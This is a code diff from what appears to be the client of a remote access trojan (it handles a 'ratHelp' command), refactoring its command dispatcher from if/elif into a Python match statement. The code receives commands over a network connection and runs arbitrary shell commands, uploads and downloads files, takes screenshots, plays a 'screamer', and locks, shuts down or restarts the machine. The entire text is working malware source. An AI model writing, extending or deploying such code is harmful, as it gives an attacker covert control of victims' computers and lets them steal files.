@@ -87,35 +87,38 @@ class Client:
         while True:
             command = self.receive_json()
             try:
-                if command[0] == "exit":
-                    self.connection.close()
-                    sys.exit()
-                elif command[0] == "ratHelp":
-                    command_response = ""
-                elif command[0] == "cd" and len(command) > 1:
-                    os.chdir(command[1])
-                    command_response = "[+] Changing active directory to " + command[1]
-                elif command[0] == "upload":
-                    command_response = self.writeFile(command[1], command[2])
-                elif command[0] == "download":
-                    command_response = self.readFile(command[1]).decode()
-                elif command[0] == "message":
-                    command_response = commands.message(command[:1])
-                elif command[0] == "lock":
-                    command_response = commands.lock_pc()
-                elif command[0] == "shutdown":
-                    command_response = commands.shutdown_pc()
-                elif command[0] == "restart":
-                    command_response = commands.restart_pc()
-                elif command[0] == "screenshot":
-                    command_response = self.screen_handler()
-                elif command[0] == "screamer":
-                    command_response = commands.screamer()
-                elif command[0] == "syscom":
-                    command_response = commands.sys_command(command[1:])
-                else:
-                    convCommand = self.arrayToString(command)
-                    command_response = self.runCommand(convCommand).decode()
+                match command[0]:
+                    case "exit":
+                        self.connection.close()
+                        sys.exit()
+                    case "ratHelp":
+                        command_response = ""
+                    case "cd":
+                        if len(command) > 1:
+                            os.chdir(command[1])
+                        convCommand = self.arrayToString(command)
+                        command_response = self.runCommand(convCommand).decode()
+                    case "upload":
+                        command_response = self.writeFile(command[1], command[2])
+                    case "download":
+                        command_response = self.readFile(command[1]).decode()
+                    case "message":
+                        command_response = commands.message(command[:1])
+                    case "lock":
+                        command_response = commands.lock_pc()
+                    case "shutdown":
+                        command_response = commands.shutdown_pc()
+                    case "restart":
+                        command_response = commands.restart_pc()
+                    case "screenshot":
+                        command_response = self.screen_handler()
+                    case "screamer":
+                        command_response = commands.screamer()
+                    case "syscom":
+                        command_response = commands.sys_command(command[1:])
+                    case _:
+                        convCommand = self.arrayToString(command)
+                        command_response = self.runCommand(convCommand).decode()
             # Whole error handling, bad practice but required to keep connection
             except Exception as e:
                 command_response = (
